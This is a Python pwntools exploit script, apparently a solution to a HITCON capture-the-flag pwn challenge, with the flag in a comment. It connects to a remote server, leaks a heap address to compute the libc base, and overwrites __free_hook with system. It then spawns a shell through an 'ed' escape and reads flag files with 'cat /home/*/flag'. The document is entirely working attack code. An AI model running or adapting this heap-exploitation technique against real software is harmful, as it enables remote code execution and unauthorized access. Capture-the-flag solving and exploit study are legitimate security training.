#!/usr/bin/env python
from pwn import *

# hitcon{T1is_i5_th3_c4ndy_for_yoU}

l = ELF( './libc.so.6' )
y = remote( '3.112.41.140' , 56746 )

y.sendlineafter( ':' , str( 0x1000000 ) )
y.recvuntil( '0x' )

heap = int( y.recvline() , 16 )
l.address = heap + 0x1000ff0
success( 'libc -> %s' % hex( l.address ) )

y.sendlineafter( ':' , hex( ( l.sym.__free_hook - heap ) / 8 )[2:] + ' ' + hex( l.sym.system )[2:] )

y.sendlineafter( ':' , 'a' * 0x1000 )
y.sendline( 'ed' )
y.sendline( '!sh' )

y.sendline( 'cat /home/*/flag' )

y.interactive()